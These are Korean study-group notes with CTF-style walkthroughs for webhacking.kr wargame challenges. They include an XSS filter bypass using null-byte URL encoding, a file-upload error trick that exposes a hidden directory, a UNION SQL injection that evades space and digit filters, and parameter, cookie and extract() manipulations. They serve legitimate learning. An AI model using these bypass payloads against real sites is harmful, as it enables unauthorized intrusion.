# 웹해킹 스터디 - 4주차 ~ 6주차 기록

## 4주차 모임
- 2016.11.21
- 참석자 : 김지연, 박지선, 한나라, 한영빈, 송지은
- 푼 문제
 - 김지연 : 23
 - 박지선 :
 - 한나라 :
 - 한영빈 :
 - 송지은 : 41

### 23번 문제
- `<script>alert(1);</script>`을 인젝션 하는 문제.
- 특수문자를 입력했을 때 필터링되지 않는다.
- "script", "alert", "sc" 등은 필터링된다. (no hack 표시)
- "s%00c"을 입력했을 때, 주소창 `code=s%2500c`로 바뀐다.
- 주소창에서 25를 지우고 `Enter` 누르면 "sc" 그대로 인젝션 된다.
- `<script>alert(1);</script>` 을 `URL인코딩`을 한다.
- 인코딩을 하면 `%3cscript%3ealert(1)%3b%3c%2fscript%3e` 값이 나온다.
- 이 값에 script와 alert 글자 사이에 `%00`을 써준다. (%00은 공백 Null의 표현)
- `%3cs%00c%00r%00i%00p%00t%3ea%00l%00e%00r%00t(1)%3b%3c%2fs%00c%00r%00i%00p%00t%3e`
- 이것을 주소창 `code=` 뒤에 입력해주면 문제해결.

### 41번 문제
- "~/index.phps" 에서 소스코드를 확인한다.
- `copy()` 함수는 `빈칸`이 값으로 들어왔을 때 취약점이 발생한다.
- `빈칸`이나 `.`을 파일명으로 입력해주면 `eregi()` 함수에서 필터링 되어 막힌다.
- 따라서 `eregi()` 함수 사용 이후에 적힌 `<`와 `>`를 이용한다.
- 파일명이 `<` 또는 `>`인 파일을 업로드하면 에러 메세지가 출력되면서 `$hidden_dir` 값이 노출된다.
- 제대로 된 파일을 업로드 한 후 "~/$hidden_dir/업로드한_파일명" 으로 접속하면 문제가 풀린다.

## 5주차 모임
- 2016.11.28
- 참석자 : 김지연, 박지선, 한나라, 한영빈, 송지은
- 푼 문제
 - 김지연 : 7
 - 박지선 :
 - 한나라 :
 - 한영빈 : 33
 - 송지은 :

### 7번문제

- URL을 보면 `val=1` 확인할 수 있다.
- `auth`을 클릭하면 `Acess_Denied`라는 안내창이 나온다.
- 소스를 보면 주석이 있다.

```html
<!-- admin mode : val=2 -->
<!--
index.phps
-->
```

- `admin mod`는 `val = 2`라는 것을 알수 있다.
- 그래서 주소창의 `val`값을 2로 변경하면
- `Access Denied!`라고 나온다.
- `index.phps` 이동해본다.
- 여기에도 주석이 있다. 주석을 통해 정보를 얻을 수 있다.

```html
<!--
db에는 val=2가 존재하지 않습니다.

union을 이용하세요
-->
```

- 주석 아래에 있는 소스를 해석해보면
- go에 val값을 저장.
- if: go값이 없으면 val=1.
- `go`값을 `ck`에 저장.
- `*`, `,`, `/`의 값을 지움.
- `--`, `2`, `substring` 등을 사용하지 못하도록 필터링.
- `Space` 사용할 수 없음.
- `rand`는 난수를 만드는 함수. (난수는 랜덤으로 이해하면 된다.)
- `rand`값에는 1~5 사이의 값을 랜덤하게 저장.

```php
$rand=rand(1,5);

if($rand==1)
{
$result=@mysql_query("select lv from lv1 where lv=($go)") or die("nice try!");
}

if($rand==2)
{
$result=@mysql_query("select lv from lv1 where lv=(($go))") or die("nice try!");
}

if($rand==3)
{
$result=@mysql_query("select lv from lv1 where lv=((($go)))") or die("nice try!");
}

if($rand==4)
{
$result=@mysql_query("select lv from lv1 where lv=(((($go))))") or die("nice try!");
}

if($rand==5)
{
$result=@mysql_query("select lv from lv1 where lv=((((($go)))))") or die("nice try!");
}

$data=mysql_fetch_array($result);
if(!$data[0]) { echo("query error"); exit(); }
if($data[0]!=1 && $data[0]!=2) { exit(); }

```

- `date[0]`가 2가 나오면 문제 해결.

```php
if($data[0]==1)
{
echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
alert('Access_Denied!')><p>");
echo("<!-- admin mode : val=2 -->");
}

if($data[0]==2)
{
echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
alert('Congratulation')><p>");
@solve();
}
```

- 주석대로 val에 union을 사용한다.
- `val = 1` 뒤에 `union select 2`을 써야하는데 `2`는 필터링 되므로 우회해야한다.
- 따라서, `val=1` 뒤에 `union SELECT (2` 입력
- `Access Denied!`라고 나온다. (어쩌란건지...)
- `2` 필터링을 피하기 위해 여러가지(삽질)을 시도한 결과
- `)union select(3-1` 입력
- 이번엔 `cannot use space`가 나온다. (...)
- `Space`를 우회해야한다는 건데...
- URL인코딩표를 보면 (공백, space)`' '` = `%0A` 라는 것을 알 수 있다.
- 그래서 `var=1)%0Aunion%0Aselect%0A(3-1` 입력.
- `nice try`라고 잠깐 뜨고 초기화면이 나온다.(일단 좋은 시도라니깐 참고 진행)
- 이번엔 var=2로 변경해서 그대로 입력 `var=2)%0Aunion%0Aselect%0A(3-1`
- val=1과 같은 반응을 한다.
- 이번엔 val값을 0으로 해서 입력해보았다. (0이 제일 만만해서 넣은건 아님)
- `var=0)%0Aunion%0Aselect%0A(3-1` 입력
- 문제 해결

### 33번 문제

> 필자 생각에, 이 문제는 끈기와 인내심을 요하는 문제인 것 같다.

이 문제는 여러게의 작은 문제를 연속으로 풀어야 하는 문제다.
100~150 점 짜리 문제 10개 연속으로 푼다고 생각하면 된다.

#### 33-1
먼저 아래와 같은 내용의 페이지가 나온다.
`/challenge/bonus/bonus-6/index.phps` 를 클릭해보자.

> Challenge 33-1   
> /challenge/bonus/bonus-6/index.phps   
> Wrong

그러면 이 문제의 서버측 코드가 나온다.

```php
<hr>
Challenge 33-1<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_GET[get]=="hehe")
{
echo("<a href=###>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

 서버에 `GET` 메소드를 통해 `get` 이라는 키로 날라온 값이 `hehe` 이면 통과하는 것을 알 수 있다. `GET` 으로 값을 전달하려는 경우 보통 주소 뒤에 쿼리스트링을 붙여서 전달한다. 예제는 아래와 같다.

```
 http:/exmaple.com?키1=값1&키2=값2
```

따라서 주소 뒤에 `?get=hehe`를 붙여서 이동하면 문제가 풀린다.

```
http://webhacking.kr/challenge/bonus/bonus-6/?get=hehe
```

#### 33-2

```php
<hr>
Challenge 33-2<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_POST[post]=="hehe" && $_POST[post2]=="hehe2")
{
echo("<a href=##>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

소스를 보면, POST 메소드로 키가 `post` 이고 값은 `hehe` 인 것과, 키가 `post2` 이고 값은 `hehe2` 인것이 오면 문제가 풀리는 것을 볼 수 있다. `POST` 메소드로 값을 전달하는 방법 중 하나는 HTML `form` 태그를 이용하는 것 이다. 다음과 같은 코드를 개발자 도구를 이용하여 페이지에 삽입하자. 문제가 요구하는 값을 가졌고, 버튼을 누르면 POST 메소드로 값을 보내는 폼이다. 삽입 후, 제출 버튼을 누르면 문제가 풀린다.

```html
<form method="post">
  <input name="post" value="hehe">
  <input name="post2" value="hehe2">
  <input type="submit">
</form>
```

#### 33-3

```php
<hr>
Challenge 33-3<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_GET[myip]==$_SERVER[REMOTE_ADDR])
{
echo("<a href=##.php>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

GET 요청을 통해 온 `myip` 가 해당 요청을 클라이언트의 IP 주소와 같으면 풀리는 문제이다.
아래와 같이 주소 뒤에 `?myip=본인의_공인IP주소` 를 넣고 이동하면 풀린다.
본인의 공인 IP는 [WhatIsMyIPAddress](https://whatismyipaddress.com/)등을 이용하면 알 수 있다.

```
http://webhacking.kr/challenge/bonus/bonus-6/33.phps?myip=본인의_공인IP주소
```

#### 33-4
> ~~여러분의 순발력을 시험하는 조금 거지같은 문제 되시겠다.~~

이번 문제는 페이지 내용이 살짝 다른데, 아래와 같다.

>Challenge 33-4   
>/challenge/bonus/bonus-6/l4.phps   
>hint : 1480253474

일단 소스를 한번 보자.

```php
<hr>
Challenge 33-4<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_GET[password]==md5(time()))
{
echo("<a href=###>Next</a>");
}
else
{
echo("hint : ".time());
}
?>
```

`time()` 함수를 호출하여 얻은 현재 시각을 `md5` Hash 로 바꾼 값과, GET 요청으로 온 `password` 값이 일치하면 풀리는 문제이다. 풀리지 않는 경우, 그냥 현재 시각을 힌트로 페이지에 출력해준다. 페이지에 찍힌 `hint` 값에 20~30 정도 더해서 `md5` Hash 로 바꿔서 넣어보자. 순발력과 인내심으로 빠르게 변환하여 주소창에 넣고 이동을 몇번 반복하면 풀린다. 예제는 아래와 같다.

```
http://webhacking.kr/challenge/bonus/bonus-6/l4.php?password=4f607be26614b5695bdfa8623c5c8e85
```

#### 33-5

```php
<hr>
Challenge 33-5<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_GET[imget] && $_POST[impost] && $_COOKIE[imcookie])
{
echo("<a href=###>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

소스를 보면, GET 요청으로 온 `imget`, POST 요청으로 온 `impost`, 쿠키값인 `imcookie` 가 모두 참이면 문제가 풀리는 것을 볼 수 있다. 어떻게 하면 GET, POST, Cookie 로 동시에 보낼 수 있을까? 생각보다 간단하다. ~~그러나 긔찮다.~~
`imget` 값은 쿼리스트링, `impost` 값은 폼 태그 하나 삽입하고, 쿠키값은 개발자 콘솔의 콘솔 탭에서 수정하면 된다.
하나씩 해 보자.

먼저 주소창 뒤에 아래와 같이 쿼리스트링을 붙여 이동한다.`imget` 값을 `1` 로 하여 쿼리스트링으로 붙이는 것이다.

```
http://webhacking.kr/challenge/bonus/bonus-6/md555.php?imget=1
```

그리고 다음과 같은 코드를 개발자 콘솔의 콘솔 탭에서 실행하여, 값이 `1` 인 쿠키, `imcookie` 를 만든다.

```js
document.cookie = "imcookie=1"
```

마지막으로 아래와 같은 코드를 페이지에 삽입하고, 제출 버튼을 누르면 풀린다.

```html
<form method="post">
  <input name="impost" value="1">
  <input type="submit">
</form>
```

#### 33-6

```php
<hr>
Challenge 33-6<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

if($_COOKIE[test]==md5("$_SERVER[REMOTE_ADDR]") && $_POST[kk]==md5("$_SERVER[HTTP_USER_AGENT]"))
{
echo("<a href=###>Next</a>");
}
else
{
echo("hint : $_SERVER[HTTP_USER_AGENT]");
}
?>
```

소스코드를 보면, 클라이언트 주소를 `md5` 로 바꾼 값과 쿠키 중 `test` 의 값과 일치하고, POST 로 보낸 `kk` 가 클라이언트의 User Agent 를 `md5` 로 변환한 것과 일치하면 풀리는 것을 볼 수 있다. 풀리지 않는 경우, User Agent 값이 페이지에 찍히는 것을 알 수 있다.

먼저 쿠키값을 고쳐보자. 일단 본인의 공인 IP 를 `md5` 로 변환한 뒤, 다음과 같은 코드를 개발자 콘솔의 콘솔 탭에서 실행하면 된다.

```javascript
document.cookie = "test=59a74d2df97a0bc5fe49bf94f16cdf1c"
```

그리고 본인의 User Agent 값을 `md5` 로 변환한다. 놀랍게도 본인의 User Agent 값을 문제 페이지에서 친절하게 보여주고 있다. 필자의 경우, User Agent 는 `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36` 이다. 이를 `md5` 로 변환하고, 아래와 같은 폼 코드를 짜서 페이지에 삽입한다.

```html
<form method="post">
  <input name="kk" value="adc50ddc21cf547721bc636b82e6dc05">
  <input type="submit">
</form>
```

그리고 제출 버튼을 누르면 문제가 풀린다.

#### 33-7

```php
<hr>
Challenge 33-7<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?
$_SERVER[REMOTE_ADDR]=str_replace(".","",$_SERVER[REMOTE_ADDR]);

if($_GET[$_SERVER[REMOTE_ADDR]]==$_SERVER[REMOTE_ADDR])
{
echo("<a href=###>Next</a>");
}
else
{
echo("Wrong<br>".$_GET[$_SERVER[REMOTE_ADDR]]);
}
?>
```
GET을 통해 받은 것의 키가 본인의 공인 IP, 값도 본인의 IP 이면 문제가 풀림을 알 수 있다, 다만 점을 공백으로 대체하는 코드가 있는것을 보아, 점을 빼고 넣어주면 될 것 같다. 본인의 IP 가 `123.123.123.123` 이라면 `123123123123` 을 넣어주면 될 것 같다. 결론적으로 아래와 같이 주소 뒤에 붙여주면 된다.

```
http://webhacking.kr/challenge/bonus/bonus-6/wtff.php?123123123123=123123123123
```

#### 33-8

> ~~문제가 끝도 없다. 뷁.~~

```php
<hr>
Challenge 33-8<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

extract($_GET);

if(!$_GET[addr]) $addr=$_SERVER[REMOTE_ADDR];

if($addr=="127.0.0.1")
{
echo("<a href=###>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

GET 요청으로 온 `addr` 값이 `127.0.0.1` 이면 문제가 풀린다. 만약에 `addr` 값이 비어 있으면 클라이언트의 IP 가 `addr` 에 저장되어 `127.0.0.1` 과 같은지 비교하는 것을 볼 수 있다. 다음과 같이 주소 뒤에 값을 붙여주면 문제가 풀린다.

```
http://webhacking.kr/challenge/bonus/bonus-6/ipt.php?addr=127.0.0.1
```

#### 33-9

```php
<hr>
Challenge 33-9<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

for($i=97;$i<=122;$i=$i+2)
{
$ch=chr($i);

$answer.=$ch;

}

if($_GET[ans]==$answer)
{
echo("<a href=###>Next</a>");
}
else
{
echo("Wrong");
}
?>
```

소스코드를 보면, 반복문에서는 97 부터 시작하여 122 까지 홀수 인 숫자들을 아스키코드 표 상에서 대응하는 문자로 바꿔서([`chr` 함수](http://php.net/manual/kr/function.chr.php)), `answer` 변수의 저장된 문자열에 덧붙이는 것([`.=` (할당연산자)](http://php.net/manual/kr/language.operators.assignment.php))을 볼 수 있다. 그리고 GET 요청을 통해 온 `ans` 가 반복문을 통해 만들어진 값과 같으면, 문제가 풀리는 것을 볼 수 있다.

일일이 아스키코드 표 보면서 값 알아내기 귀찮으므로, 다음과 같은 자바스크립트 코드를 콘솔에서 돌려보자.
그냥 아래 코드를 콘솔에 복붙하고 엔터키를 눌러보자.

```javascript
var answer = "";
for(var i=97; i<=122; i+=2){
  answer += String.fromCharCode(i);
}
console.log("ANSWER : "+answer);
```

그럼 아래와 같은 결과가 나온다.

```
ANSWER : acegikmoqsuwy
```

`ans` 의 값을 `acegikmoqsuwy` 로 보내주면 됨을 알 수 있다.

아래와 같이 주소 뒤에 붙여서 이동하자. 그러면 문제가 풀린다.

```
http://webhacking.kr/challenge/bonus/bonus-6/nextt.php?ans=acegikmoqsuwy
```

#### 33-10

일단은... Wrong! 이 없는 걸 보니 이게 마지막 인 것 같다.

```php
<hr>
Challenge 33-10<br>
<script>document.write("<a href=http://webhacking.kr<?=$_SERVER[PHP_SELF]?>s><?=$_SERVER[PHP_SELF]?>s</a>");</script>
<hr>

<?

$ip=$_SERVER[REMOTE_ADDR];

for($i=0;$i<=strlen($ip);$i++)
{
$ip=str_replace($i,ord($i),$ip);
}

$ip=str_replace(".","",$ip);

$ip=substr($ip,0,10);

@mkdir("answerip/$ip");

$answer=$ip*2;
$answer=$ip/2;
$answer=str_replace(".","",$answer);

$pw="###";

$f=fopen("answerip/$ip/$answer.$ip","w");
fwrite($f,"Password is $pw\n\nclear ip : $_SERVER[REMOTE_ADDR]");
fclose($f);




?>

```

공인 IP 주소 받아다가 지지고 볶아서 나온 값을 기반으로, 파일을 하나 만들고(`/answerip/$ip값/$answer값.$ip값`), 그곳에 최종 플래그 값을 찍는 것 같다.
일일이 해석하기는 귀찮고... 조금 수정해다가 실행해서 `answer` 와 `ip` 값을 알아내 보자. [webhacking.kr PHP PAD](http://webhacking.kr/pds/phppad/index.php) 나 [Codepad](http://codepad.org/) 등을 이용해서 코드를 실행 할 수 있다. 다음과 같이 수정하여 실행해서 값을 알아내 보자.

```php
<?

$ip="본인의 공인IP";

for($i=0;$i<=strlen($ip);$i++)
{
$ip=str_replace($i,ord($i),$ip);
}

$ip=str_replace(".","",$ip);

$ip=substr($ip,0,10);

echo "IP : $ip ";

$answer=$ip*2;
$answer=$ip/2;
$answer=str_replace(".","",$answer);

echo "ANSWER : $answer ";

?>
```

코드를 실행하면 아래와 같이 값이 찍힌다.

```
IP : ???????? ANSWER : ????????
```

이제 이 값을 `/answerip/$ip값/$answer값.$ip값` 에 그대로 대입하여 주소창에 넣어보자.

```
http://webhacking.kr/challenge/bonus/bonus-6/answerip/$ip값/$answer값.$ip값
```

화면에 나타나는 플래그를 `Auth` 에 제출하면 문제가 풀린다.
